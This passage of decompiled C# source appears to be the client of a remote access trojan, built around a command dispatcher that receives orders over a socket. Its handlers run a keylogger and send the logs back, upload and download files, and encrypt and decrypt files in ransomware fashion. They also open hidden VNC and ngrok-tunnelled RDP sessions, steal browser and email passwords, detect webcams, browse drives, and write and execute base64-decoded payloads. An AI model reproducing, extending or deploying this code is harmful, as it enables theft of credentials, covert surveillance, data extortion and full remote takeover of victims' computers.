				object[] array80 = array2;
				bool[] array4 = new bool[5] { true, true, true, true, false };
				NewLateBinding.LateCall(obj25, (Type)null, "CON", array80, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				if (array4[3])
				{
					Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
				}
				break;
			}
			case "KL":
				try
				{
					KL.Abort();
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
				}
				KL = new Thread((ThreadStart)delegate
				{
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "logdf", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				});
				KL.Start();
				break;
			case "closeKL":
				try
				{
					KL.Abort();
					break;
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
					break;
				}
			case "KLget":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"KLget", SPL), (object)Helper.ID())));
				break;
			case "KLGET":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"KLGET", SPL), Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\" + Helper.ID(), "KL", null)), SPL), (object)Helper.ID())));
				break;
			case "TCPV":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"TCPV", SPL), (object)Helper.ID())));
				break;
			case "TCPG":
			{
				object obj22 = Operators.ConcatenateObject((object)"TCPG", SPL);
				object obj23 = Helper.objj(array[1]);
				object[] array5 = new object[1];
				object[] array77 = array5;
				string[] array7 = array;
				string[] array78 = array7;
				int num = 2;
				array77[0] = array78[2];
				object[] array2 = array5;
				object[] array79 = array2;
				bool[] array4 = new bool[1] { true };
				object obj24 = NewLateBinding.LateGet(obj23, (Type)null, "GETTCP", array79, (string[])null, (Type[])null, array4);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(obj22, obj24), SPL), (object)Process.GetCurrentProcess().Id), SPL), (object)Helper.ID())));
				break;
			}
			case "ACT":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"ACT", SPL), (object)Helper.ID())));
				break;
			case "ACTG":
			{
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "GetActiveWindows", new object[0], (string[])null, (Type[])null, (bool[])null));
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = ((IEnumerable)objectValue2).GetEnumerator();
					while (enumerator.MoveNext())
					{
						string text2 = Conversions.ToString(enumerator.Current);
						try
						{
							ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"ACTG", SPL), (object)Helper.ID()), SPL), (object)text2)));
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"ENBC", SPL), (object)Helper.ID())));
				break;
			}
			case "killAct":
			{
				object obj21 = Helper.objj(array[1]);
				object[] array5 = new object[1];
				object[] array74 = array5;
				string[] array7 = array;
				string[] array75 = array7;
				int num = 2;
				array74[0] = array75[2];
				object[] array2 = array5;
				object[] array76 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj21, (Type)null, "Kill", array76, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"Ref", SPL), (object)Helper.ID())));
				break;
			}
			case "FURL":
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[1], array[2]);
				break;
			case "msgg":
				MessageBox.Show(array[1]);
				break;
			case "UPtoS":
				((ServerComputer)MyProject.Computer).get_Network().UploadFile(array[2], array[1]);
				break;
			case "FSG":
			{
				object obj19 = Helper.objj(array[1]);
				object[] array5 = new object[3];
				object[] array64 = array5;
				string[] array7 = array;
				string[] array65 = array7;
				int num = 2;
				array64[0] = array65[2];
				object[] array66 = array5;
				string[] array10 = array;
				string[] array67 = array10;
				int num2 = 3;
				array66[1] = array67[3];
				object[] array68 = array5;
				string[] array27 = array;
				string[] array69 = array27;
				int num4 = 4;
				array68[2] = array69[4];
				object[] array2 = array5;
				object[] array70 = array2;
				bool[] array4 = new bool[3] { true, true, true };
				NewLateBinding.LateCall(obj19, (Type)null, "RUN", array70, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array10[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					array27[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				break;
			}
			case "RENC":
				if (RS != 1)
				{
					RS = 1;
					object obj16 = Helper.objj(array[1]);
					object[] array5 = new object[5]
					{
						Helper.ID(),
						null,
						null,
						null,
						null
					};
					object[] array53 = array5;
					string[] array27 = array;
					string[] array54 = array27;
					int num4 = 2;
					array53[1] = array54[2];
					object[] array55 = array5;
					string[] array7 = array;
					string[] array56 = array7;
					int num = 3;
					array55[2] = array56[3];
					object[] array57 = array5;
					string[] array10 = array;
					string[] array58 = array10;
					int num2 = 4;
					array57[3] = array58[4];
					object[] array59 = array5;
					string[] array24 = array;
					string[] array60 = array24;
					int num3 = 5;
					array59[4] = array60[5];
					object[] array2 = array5;
					object[] array61 = array2;
					bool[] array4 = new bool[5] { false, true, true, true, true };
					NewLateBinding.LateCall(obj16, (Type)null, "ENC", array61, (string[])null, (Type[])null, array4, true);
					if (array4[1])
					{
						array27[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
					}
					if (array4[2])
					{
						array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
					}
					if (array4[3])
					{
						array10[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
					}
					if (array4[4])
					{
						array24[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[4]), typeof(string));
					}
					RS = 2;
				}
				break;
			case "RDEC":
				if (RS == 2)
				{
					RS = 1;
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "DEC", new object[1] { Helper.ID() }, (string[])null, (Type[])null, (bool[])null, true);
					RS = 0;
				}
				break;
			case "HVNC":
			{
				object obj15 = Helper.objj(array[1]);
				object[] array5 = new object[2];
				object[] array48 = array5;
				string[] array24 = array;
				string[] array49 = array24;
				int num3 = 2;
				array48[0] = array49[2];
				object[] array50 = array5;
				string[] array27 = array;
				string[] array51 = array27;
				int num4 = 3;
				array50[1] = array51[3];
				object[] array2 = array5;
				object[] array52 = array2;
				bool[] array4 = new bool[2] { true, true };
				NewLateBinding.LateCall(obj15, (Type)null, "Run", array52, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array24[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array27[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				break;
			}
			case "ngrok":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"ngrok", SPL), (object)Helper.ID())));
				break;
			case "InstallN":
				if (ngrok != 1)
				{
					ngrok = 1;
					object obj12 = Helper.objj(array[1]);
					object[] array5 = new object[1];
					object[] array41 = array5;
					string[] array24 = array;
					string[] array42 = array24;
					int num3 = 2;
					array41[0] = array42[2];
					object[] array2 = array5;
					object[] array43 = array2;
					bool[] array4 = new bool[1] { true };
					NewLateBinding.LateCall(obj12, (Type)null, "install", array43, (string[])null, (Type[])null, array4, true);
					if (array4[0])
					{
						array24[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"InstallngC", SPL), (object)Helper.ID())));
					ngrok = 0;
				}
				break;
			case "hrdp":
				if (File.Exists(Interaction.Environ("Temp") + "\\ngrok.exe"))
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"hrdp", SPL), (object)Helper.ID())));
				}
				else
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"ngrok", SPL), (object)Helper.ID())));
				}
				break;
			case "hrdp+":
			{
				object obj6 = Operators.ConcatenateObject((object)"hrdp+", SPL);
				object obj7 = Helper.objj(array[1]);
				object[] array5 = new object[2];
				object[] array23 = array5;
				string[] array24 = array;
				string[] array25 = array24;
				int num3 = 2;
				array23[0] = array25[2];
				object[] array26 = array5;
				string[] array27 = array;
				string[] array28 = array27;
				int num4 = 3;
				array26[1] = array28[3];
				object[] array2 = array5;
				object[] array29 = array2;
				bool[] array4 = new bool[2] { true, true };
				object obj8 = NewLateBinding.LateGet(obj7, (Type)null, "install", array29, (string[])null, (Type[])null, array4);
				if (array4[0])
				{
					array24[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array27[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(obj6, Operators.AddObject(Operators.AddObject(obj8, SPL), (object)Helper.ID()))));
				break;
			}
			case "PassR":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"PassR", SPL), (object)Helper.ID())));
				break;
			case "PC#":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"Getpass", SPL), (object)Helper.ID()), SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "get", new object[0], (string[])null, (Type[])null, (bool[])null))));
				break;
			case "Pvbnet":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"Getpass", SPL), (object)Helper.ID()), SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "gett", new object[0], (string[])null, (Type[])null, (bool[])null))));
				break;
			case "WDPL":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "gett", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "Email":
			{
				string text = Conversions.ToString(NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "Emails", new object[0], (string[])null, (Type[])null, (bool[])null));
				if (Operators.CompareString(text, "Error!", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"Getpass", SPL), (object)Helper.ID()), SPL), (object)"Error!")));
				}
				else
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject((object)"Getpass", SPL), (object)Helper.ID()), SPL), (object)text)));
				}
				break;
			}
			case "Xchat":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"Xchat", SPL), (object)Helper.ID())));
				break;
			case "LLCHAT":
			{
				object obj = Helper.objj(array[1]);
				object[] array2 = new object[5]
				{
					Settings.Host,
					Settings.Port,
					Settings.SPL,
					Settings.KEY,
					Helper.ID()
				};
				object[] array3 = array2;
				bool[] array4 = new bool[5] { true, true, true, true, false };
				NewLateBinding.LateCall(obj, (Type)null, "CON", array3, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				if (array4[3])
				{
					Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
				}
				break;
			}
			case "SNote":
				Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\" + Helper.ID(), "NT", array[1]);
				break;
			}
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	[DllImport("user32.dll")]
	internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

	[DllImport("avicap32.dll")]
	public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	public static bool Cam()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					string lpszVer = null;
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	public static string getFolders(object location)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
		object obj = "";
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			obj = Operators.AddObject(obj, (object)string.Concat("[Folder]" + directoryInfo2.get_Name(), "FileManagerSplitFileManagerSplit"));
		}
		return Conversions.ToString(obj);
	}

	public static string getFiles(object location)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
		object obj = "";
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		foreach (FileInfo fileInfo in files)
		{
			obj = Operators.AddObject(obj, (object)string.Concat(string.Concat(fileInfo.get_Name() + "FileManagerSplit", fileInfo.Length.ToString()), "FileManagerSplit"));
		}
		return Conversions.ToString(obj);
	}

	public static string getDrives()
	{
		string text = "";
		foreach (DriveInfo drife in ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives())
		{
			switch (drife.DriveType)
			{
			case DriveType.Removable:
				text = text + "[USB]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.Fixed:
				text = text + "[Drive]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.Network:
				text = text + "[NET]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.CDRom:
				text = text + "[CD]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			}
		}
		return text;
	}

	private static void Download(string Name, string Data)
	{
		try
		{
			object obj = Path.GetTempFileName() + Name;
			File.WriteAllBytes(Conversions.ToString(obj), (byte[])Helper.frombase64(Data));
			Thread.Sleep(500);
			Type typeFromHandle = typeof(Process);
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(obj) };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall((object)null, typeFromHandle, "Start", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				obj = RuntimeHelpers.GetObjectValue(array[0]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
